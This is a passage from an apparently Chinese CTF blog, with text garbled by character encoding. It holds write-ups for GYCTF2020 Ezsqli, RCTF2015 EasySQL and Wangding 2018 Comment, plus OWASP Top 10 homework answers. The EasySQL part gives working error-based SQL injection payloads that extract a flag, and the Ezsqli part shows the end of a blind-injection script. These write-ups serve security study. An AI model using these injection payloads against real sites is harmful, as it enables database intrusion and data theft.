print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        <span class="comment"># time.sleep(0.03)</span></span><br><span class="line">    flag += (<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ­äº†ä¸ªpostæ¶ï¼Œä¹Ÿä¸çŸ¥é“å¥½ä¸å¥½ç”¨â€¦â€¦</p>
</blockquote>
<img src="/images/GYCTF2020-Ezsqli/image-20210504112734844.png" alt="image-20210504112734844" style="zoom:80%;">

<p>è½¬å°å†™å¾—åˆ°flagâ€¦â€¦</p>
<p>flag{333ed6af-c961-438b-91fd-c578e87536a6}</p>
</div><div class="index-category-tag">Â Â <hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-04-25Â Â <a class="commentCountImg" href="/2021/04/25/RCTF2015-EasySQL/#comment-container"><span class="display-none-class">/2021/04/25/RCTF2015-EasySQL/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="59d8af43d29b96f0d264ba5c696aa26b">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>4 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.5Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/25/RCTF2015-EasySQL/">RCTF2015-EasySQL</a></h1><div class="content"><h3><span id="rctf2015easysql">[RCTF2015]EasySQL</span></h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæœ‰æ³¨å†Œå’Œä¿®æ”¹å¯†ç åŠŸèƒ½â€¦â€¦ä¼¼ä¹æœ‰index.phpsæºç ï¼Œä½†æ˜¯forbidden</p>
<p>å‘ç°adminå·²ç»è¢«æ³¨å†Œâ€¦â€¦éš¾é“å¯ä»¥å…ˆæ³¨å…¥è·å–adminè´¦æˆ·å†å¾—åˆ°æºç è¿›ä¸€æ­¥æ¸—é€ï¼Ÿ</p>
<p>æ³¨å†Œä¸€ä¸ª<code>\</code>,åœ¨changeå¯†ç æ—¶å‘ç”ŸæŠ¥é”™ï¼š</p>
<p><img src="/images/RCTF2015-EasySQL/image-20210425120947836.png" alt="image-20210425120947836"></p>
<p>pwdåçš„ä¸€ä¸²æ˜¯0çš„md5å€¼â€¦â€¦</p>
<p>è¿™å¯èƒ½æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œåœ¨æ‹¿å‡ºæ•°æ®æ—¶æ²¡æœ‰è¿›è¡Œè½¬ä¹‰å‘ç”Ÿçš„æ¼æ´ï¼Œé‰´äºæ‰“å°äº†æŠ¥é”™ä¿¡æ¯ï¼Œå³å¯è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p>
<p>ç±»ä¼¼ä¹‹å‰çš„é¢˜æ„é€ ï¼Œä½†æ˜¯ç”¨æˆ·åå­˜åœ¨è¿‡æ»¤ï¼Œé¦–æ¬¡å°è¯•fuzzæ“ä½œâ€¦â€¦</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121328003.png" alt="image-20210425121328003" style="zoom:80%;">

<p>è¿‡æ»¤äº†å¾ˆå¤šâ€¦â€¦</p>
<p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</code>æˆåŠŸå›æ˜¾æ•°æ®åº“å</p>
<p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c6167)),0x7e),1)#</code>è·å–è¡¨å</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121530565.png" alt="image-20210425121530565" style="zoom:80%;">

<p>å‘ç°flagè¡¨</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121603887.png" alt="image-20210425121603887" style="zoom:80%;">

<p>flagåˆ—</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121624544.png" alt="image-20210425121624544" style="zoom:80%;">

<p>fakeflagâ€¦â€¦é‚£å»æŸ¥æŸ¥userè¡¨</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121710797.png" alt="image-20210425121710797" style="zoom:80%;">

<p>åº”è¯¥æ˜¯real_flag_1s_hereï¼Œä¼¼ä¹æœ‰å¤šè¡Œâ€¦â€¦concat</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121803527.png" alt="image-20210425121803527" style="zoom:80%;">

<p>è¿™æ ·çš„æŸ¥è¯¢è¡¨æ˜ï¼Œå¾ˆå¤šè¡Œçš„æ•°æ®éƒ½æ˜¯xxxï¼Œè€Œflagåº”å½“åœ¨å…¶ä¸­ä¸€è¡Œ</p>
<blockquote>
<p>limitä¼¼ä¹ç”¨ä¸äº†ï¼Œå¾ˆå¤šåŠ å¯†ä¹Ÿä¸è¡Œï¼Œmidã€substrã€rightã€leftéƒ½è¢«banäº†â€¦â€¦</p>
</blockquote>
<p>å­¦ä¹ äº†æ­£åˆ™çš„ä½¿ç”¨ï¼š</p>
<p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(select(real_flag_1s_here)regexp(&#39;^l&#39;))),0x7e),1)#</code></p>
<p>æˆ–</p>
<p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1)#</code></p>
<p>where(real_flag_1s_here)regexp(â€˜^fâ€™)åŒ¹é…real_flag_1s_hereåˆ—ä¸­ä»¥få¼€å¤´çš„é‚£ä¸€è¡Œæ•°æ®ï¼Œå¤§æ¦‚æ˜¯ä¼˜å…ˆäºgroup_concatçš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ï¼š</p>
<blockquote>
<p>â€œ&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(â€˜^fâ€™)),0x7e),1)#</p>
</blockquote>
<p>æ€ä¹ˆè§£å†³ä½æ•°ä¸è¶³æ˜¾ç¤ºä¸å…¨çš„é—®é¢˜å‘¢ï¼Ÿæ­£åˆ™å¸®åŠ©æˆ‘ä»¬æ‹¿å‡ºäº†è¿™ä¸€è¡Œçš„æ•°æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿™è¡Œæ•°æ®é€†å‘è¾“å‡º</p>
<h4><span id="reverse">reverse</span></h4><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),0x7e),1)#</code></p>
<blockquote>
<p>XPATH syntax error: â€˜~flag{4c5c3709-12d5-40af-82f2-c3â€™</p>
<p>XPATH syntax error: â€˜~}8f414a13433c-2f28-fa04-5d21-90â€™</p>
<p>&lt;phpï¼Ÿecho strrev(â€œ}8f414a13433c-2f28-fa04-5d21-90â€);</p>
</blockquote>
<p>flag{4c5c3709-12d5-40af-82f2-c33431a414f8}</p>
<p>è·å¾—flagâ€¦â€¦</p>
</div><div class="index-category-tag">Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-04-24Â Â <a class="commentCountImg" href="/2021/04/24/hacker101-1/#comment-container"><span class="display-none-class">/2021/04/24/hacker101-1/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="478de037f298d8ee969e30a006066208">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>9 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>1.3Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/24/hacker101-1/">hacker101.1</a></h1><div class="content"><h5><span id="hacker1011">hacker101.1</span></h5><p>2.è§‚çœ‹è§†é¢‘äºŒï¼Œå›ç­”ä¸‹åˆ—é—®é¢˜ï¼š</p>
<p>è§†é¢‘äºŒï¼š<a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a> </p>
<p>1.ç›®å‰owaspçš„åå¤§webå®‰å…¨æ¼æ´æ˜¯å“ªäº›ï¼Ÿè¿™äº›æ¼æ´æ’åæ˜¯æŒ‰ç…§æ¼æ´çš„ä¸¥é‡ç¨‹åº¦æ’åºçš„è¿˜æ˜¯æŒ‰ç…§æ¼æ´çš„å¸¸è§ç¨‹åº¦æ’åºçš„ï¼Ÿï¼ˆ2åˆ†ï¼‰ </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://wiki.owasp.org/images/d/dc/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.3.pdf">ä¸­æ–‡PDF-2017</a></p>
<ol>
<li><p><strong>æ³¨å…¥æ¼æ´ï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Injection">Injection</a></p>
</li>
<li><p><strong>èº«ä»½è®¤è¯å¤±æ•ˆï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Authentication">Broken Authentication</a></p>
</li>
<li><p><strong>æ•æ„Ÿæ•°æ®æ³„éœ²ï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Data">Sensitive Data Exposure</a></p>
</li>
<li><p><strong>XMLå¤–éƒ¨å®ä½“æ¼æ´ï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#XML">XML External Entities (XXE)</a></p>
</li>
<li><p><strong>è®¿é—®æ§åˆ¶å¤±æ•ˆï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Access">Broken Access Control</a></p>
</li>
<li><p><strong>å®‰å…¨é…ç½®é”™è¯¯ï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Misconfigurations">Security Misconfigurations</a></p>
</li>
<li><p><strong>è·¨ç«™è„šæœ¬æ”»å‡»ï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#XSS">Cross-Site Scripting (XSS)</a></p>
</li>
<li><p><strong>ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Deserialization">Insecure Deserialization</a></p>
</li>
<li><p><strong>ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶ï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Vulnerabilities">Using Components with Known Vulnerabilities</a></p>
</li>
<li><p><strong>æ—¥å¿—å’Œç›‘æ§ä¸è¶³ï¼š</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Insufficient">Insufficient Logging and Monitoring</a></p>
<p><strong><em>OWASP Top 10 is a ranking of the ten most dangerous information security risks for web applications, compiled by a community of industry experts. For each point of the rating, the risk is calculated by experts based on the<a target="_blank" rel="noopener" href="https://owasp.org/www-project-risk-assessment-framework/">OWASP Risk Rating Methodology</a>and includes an assessment of Weakness Prevalence, Weakness Detectability and Exploitability, as well as the criticality of the consequences of their operation or Technical Impacts.</em></strong></p>
<p><strong>å‰10å¤§é£é™©é¡¹æ˜¯æ ¹æ®æµè¡Œæ•°æ®é€‰æ‹©å’Œä¼˜å…ˆæ’åºï¼Œå¹¶ç»“åˆäº†å¯¹å¯åˆ©ç”¨æ€§ã€å¯æ£€æµ‹æ€§å’Œå½±å“ç¨‹åº¦çš„ä¸€è‡´æ€§è¯„ä¼°è€Œå½¢æˆã€‚</strong></p>
</li>
</ol>
</blockquote>
<p>2.è¯·ç¿»è¯‘ä¸€ä¸‹credential stuffingï¼ˆ1åˆ†ï¼‰ </p>
<blockquote>
<p>â€‹    <strong><em>one thatâ€™s really common from a pentesting perspective is what we call credential stuffing. And say that we go out we grab data from breached data thatâ€™s out there so an account thatâ€™s been compromised the list shows up on the internet and now, the hackers have access to usernames and passwords and say we are testing in some website.</em></strong></p>
<p>â€‹    <strong><em>we just send usernames and passwords to an application ,and thereâ€™s no threat detection weâ€™re just able to pound a login form or even use something like password spraying where we just take something like spring 2019 or summer 2020 exclamation and just throw common credentials out there and see if it sticks if weâ€™re able to continuously brute force  an application without anything preventing us or any account lockouts.</em></strong></p>
<p>emmï¼Œå®é™…ä¸Šå°±æ˜¯æ’åº“å—â€¦â€¦</p>
<p>åˆ©ç”¨å·²æ³„éœ²çš„è´¦æˆ·ä¿¡æ¯åœ¨å¤šä¸ªå¹³å°è¿›è¡Œå°è¯•ï¼Œè¿™ç§å°è¯•å¾ˆéš¾è¢«æ£€æµ‹å‡ºæ¥ã€‚ä¸åŒçš„ç”¨æˆ·åä¸å¯†ç ï¼Œç”šè‡³äºæ‰‹æœºå·ï¼Œèº«ä»½è¯å·ç­‰ç­‰æ•æ„Ÿä¿¡æ¯è¿›è¡Œç»„åˆæ¥å°è¯•ç™»å½•ã€‚å¯èƒ½ç”¨æˆ·åœ¨å¤šä¸ªå¹³å°çš„è´¦æˆ·ä¸å¯†ç æ˜¯ç›¸åŒçš„ï¼Œè¿™æ ·å°±ååˆ†å±é™©ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44549063/article/details/113518965"><strong>Credential Stuffing Attack</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/still_night/article/details/104837926">Beyond credential stuffing</a></p>
</blockquote>
<p>3.ä¸ºä»€ä¹ˆè¯´ä¸å……åˆ†çš„æ—¥å¿—è®°å½•(insufficient logging)ä¹Ÿç®—owaspåå¤§æ¼æ´çš„ä¸€ç§ï¼Ÿä»–çš„å±å®³æ€§å¦‚ä½•ï¼ˆ2åˆ†ï¼‰ </p>
<blockquote>
<p> ä¹‹æ‰€ä»¥æœ‰å¾ˆå¤šå…¥ä¾µè¡Œä¸ºå‘ç”Ÿï¼Œå…¶ä¸­åŸå› ä¹‹ä¸€æ˜¯æ²¡æœ‰è¡Œä¸ºç›‘ç®¡ï¼Œæˆ–ç›‘ç®¡ä¸å……åˆ†ã€‚å…¥ä¾µè€…rè¿›å…¥ç³»ç»Ÿç„¶è€Œæ²¡æœ‰æ—¥å¿—è®°å½•è¿™ä¸€è¡Œä¸ºï¼Œæˆ–æ—¥å¿—è®°å½•ä¸å……åˆ†ã€‚</p>
<p>æ‰€ä»¥ï¼Œåœ¨åšä¸€äº›é¡¹ç›®æ—¶ï¼Œæ£€æŸ¥æ—¥å¿—ä¸ç›‘æ§æ˜¯ååˆ†é‡è¦çš„ã€‚ä¸å……åˆ†çš„æ—¥å¿—è®°å½•ä¸ç›‘ç®¡å¯èƒ½ä¼šå¯¼è‡´å¾ˆå¤šå…¥ä¾µè¡Œä¸ºçš„å‘ç”Ÿã€‚</p>
</blockquote>
<p>4.è¯·ç¿»é˜…ä¸€ä¸‹owasp testing guideï¼Œä»¥åŠowasp testing guide check-listï¼Œè§†é¢‘è¯´æ€ä¹ˆç»“åˆè¿™ä¸¤ä¸ªæ–‡æ¡£æ¥å­¦ä¹ æ¸—é€æµ‹è¯•ï¼Ÿ ç»“åˆä½ å¹³æ—¶æ¸—é€è¿‡ç¨‹ä¸­çš„ç»éªŒï¼Œè°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ3åˆ†ï¼‰ </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/frontispiece/index.html">ä¸­æ–‡ç‰ˆtesting-guide</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/tanprathan/OWASP-Testing-Checklist">https://github.com/tanprathan/OWASP-Testing-Checklist</a></p>
<p>ä»testing guideä¸­ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°æ‰€æœ‰çš„ä¸åŒçš„æ¸—é€æµ‹è¯•ä¸€ä¸ªç½‘ç«™åº”ç”¨çš„æ–¹æ³•ã€‚check-listå¯ä»¥æä¾›æˆ‘ä»¬åœ¨æµ‹è¯•ä¸­æ‰€æœ‰è¦æ£€æŸ¥çš„ç‚¹ï¼Œå¹¶ä¸ºè¿™äº›ç‚¹æä¾›æµ‹è¯•å·¥å…·ã€‚check-listä¸­çš„æµ‹è¯•ç‚¹å¯æ‹¿åˆ°testing guideä¸­æ£€ç´¢å¾—åˆ°æ›´ä¸ºè¯¦å°½çš„ä¿¡æ¯ä¸æ€»ç»“ï¼Œsearch engineã€operatorâ€¦â€¦and step by stepã€‚</p>
<p>emmmï¼Œé€ŸæŸ¥ä¸æ•™ç§‘ä¹¦çš„å…³ç³»â€¦â€¦ï¼Ÿæ¸—é€æµ‹è¯•æ˜¯å¼€å·çš„ï¼Œé€ŸæŸ¥ä¸æ•™ç§‘ä¹¦å°±æ˜¾å¾—ååˆ†é‡è¦â€¦â€¦                                                                                                                               æˆ‘ä»¬éœ€è¦æ¸…æ¥šåº”ç”¨å·¥ä½œçš„æ–¹å¼ï¼Œç†Ÿæ‚‰æµ‹è¯•çš„é€»è¾‘ï¼Œè€Œcheck-listå’Œtesting-guideè´Ÿè´£å¸®åŠ©æˆ‘ä»¬ç†é¡ºé€»è¾‘å¹¶è®°å¿†åŸºç¡€æµ‹è¯•ç‚¹ã€‚</p>
<p>ä»æ€è€ƒä¸é€»è¾‘å‡ºå‘ï¼Œæœ€ç»ˆè½å®åˆ°check-list and testing-guideã€‚check-list and testing-guideå¸®åŠ©æˆ‘ä»¬æŸ¥æ¼è¡¥ç¼ºã€‚</p>
</blockquote>
<ol start="5">
<li>you are only as good as you notes   you are only as good as things you can refer toç»“åˆè¿™ä¸¤å¥è¯è°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ2åˆ†ï¼‰</li>
</ol>
<blockquote>
<p>æŒºå¥½â€¦â€¦owaspæä¾›äº†å¾ˆå¥½çš„èµ„æºï¼Œå„ç§test-guidingï¼Œhacker101ä¹Ÿæä¾›äº†å¾ˆå¥½çš„å­¦ä¹ èµ„æºï¼ˆåŒ…æ‹¬è‹±è¯­â€¦â€¦</p>
<p>å†™åšå®¢è¿™ä¹ˆé•¿æ—¶é—´ï¼Œæ„Ÿè§‰ä¹Ÿç¡®å®æœ‰ç”¨ã€‚åŒ…æ‹¬èµ„æ–™æŸ¥æ‰¾ã€è®°å½•payloadã€å„ç§çŸ¥è¯†ç‚¹â€¦â€¦æˆ‘ä»¬æ‰€è®°å½•çš„ã€å¯å‚è€ƒçš„ä¸œè¥¿æ˜¯è®°å¿†å¯é çš„å»¶ä¼¸ã€‚</p>
</blockquote>
</div><div class="index-category-tag">Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-04-24Â Â <a class="commentCountImg" href="/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/#comment-container"><span class="display-none-class">/2021/04/24/ç½‘é¼æ¯-2018-Comment/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="a0a91c94781162f02eeee57613eb8ffc">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>8 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>1.2Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/">ç½‘é¼æ¯-2018-Comment</a></h1><div class="content"><h3><span id="ç½‘é¼æ¯-2018comment">[ç½‘é¼æ¯ 2018]Comment</span></h3><p>å­¦ä¹ äº†ä¸å°‘çŸ¥è¯†â€¦â€¦â€¦â€¦</p>
<p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œç•™è¨€éœ€è¦ç™»å½•ï¼Œå…ˆä¸ç®¡â€¦â€¦å‘ç°å­˜åœ¨gitæ³„éœ²ï¼Œä¸Šgithackï¼š</p>
<p>write_doï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…³é”®è¿™ç©æ„æ²¡å•¥ç”¨å•Šâ€¦â€¦å­¦ä¹ ä¸€æ³¢gitæ¢å¤</p>
<blockquote>
<p>gitExtractå·¥å…·ä¼¼ä¹ä¼šè‡ªåŠ¨æ¢å¤æ³„éœ²æ–‡ä»¶â€¦â€¦å›å»è¯•è¯•â€¦â€¦</p>
</blockquote>
<h4><span id="gitæ¢å¤">gitæ¢å¤</span></h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html">https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html</a></p>
<p><a href="%5Bhttps://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control%5D(https://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control)">git reset ä½¿ç”¨åŠå›æ»š</a></p>
<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/0013745374151782eb658c5a5ca454eaa451661275886c6000">gitçš„å·¥ä½œåŒºå’Œæš‚å­˜åŒº</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jjlovefj/article/details/86476925">git log è¯¦è§£</a></p>
<img src="/images/ç½‘é¼æ¯-2018-Comment/image-20210425204527594.png" alt="image-20210425204527594" style="zoom:80%;">

<blockquote>
<p>æäº¤ä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™æ˜¯åˆ†ä¸º<code>git add</code>ã€<code>git commit</code>ä¸¤æ­¥çš„<br>å½“<code>git add</code>çš„æ—¶å€™ï¼Œæ˜¯æŠŠæ–‡ä»¶ä¸´æ—¶æ”¾åœ¨ä¸´æ—¶åŒºstageä¸­<br>å½“<code>git commit</code>çš„æ—¶å€™ï¼Œæ˜¯æŠŠä¸´æ—¶åŒºstageçš„æ‰€æœ‰å†…å®¹æäº¤åˆ°å½“å‰åˆ†æ”¯<br>å½“ç„¶è¿™ä¸¤ä¸ªåœ¨objectsç›®å½•éƒ½ä¼šç”Ÿæˆä¸€ä¸ªå¯¹è±¡æ–‡ä»¶ï¼Œæ¥å­˜å‚¨æ•°æ®ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨ git add å‘½ä»¤å°†å†…å®¹å†™å…¥æš‚å­˜åŒºã€‚                                                                                                                   git commit å‘½ä»¤ä¼šå°†æš‚å­˜åŒºå†…å®¹æ·»åŠ åˆ°æœ¬åœ°ä»“åº“ä¸­</p>
</blockquote>
<p>è¿™é‡Œè¦ç»“åˆGitHackerä½¿ç”¨ï¼Œgithackerä¼¼ä¹åœ¨è·å–æ³„éœ²æ–‡ä»¶ä¸Šèƒ½å¤Ÿè·å–åˆ°æ›´è¯¦å°½çš„ä¿¡æ¯ã€‚</p>
<blockquote>
<p>ä¸ªäººä½“éªŒï¼šGitHackerè¦åœ¨linuxä¸Šç”¨ï¼Œéœ€è¦pythonçš„requestsâ€¦â€¦</p>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ï¼šgit logæŸ¥çœ‹commit historyï¼š</p>
<img src="/images/ç½‘é¼æ¯-2018-Comment/image-20210424151445916.png" alt="image-20210424151445916" style="zoom:80%;">

<p>git resetå›æ»šæœªcommitç‰ˆæœ¬å‰å·²ç»commitçš„ç½‘é¡µæºä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span 